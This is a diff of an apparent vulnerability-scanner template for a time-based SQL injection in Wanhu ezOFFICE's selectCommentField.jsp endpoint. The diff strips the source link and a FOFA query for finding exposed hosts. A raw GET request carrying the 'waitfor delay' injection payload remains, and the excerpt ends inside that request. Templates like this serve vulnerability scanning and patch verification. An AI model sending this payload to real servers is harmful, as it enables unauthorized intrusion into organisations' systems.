@@ -3,12 +3,8 @@ info:
   name: 万户 ezOFFICE  selectCommentField  SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ybxvu8vbxgz764b9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ybxvu8vbxgz764b9
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'GET /defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;waitfor+delay+''0:0:3''--+- HTTP/1.1
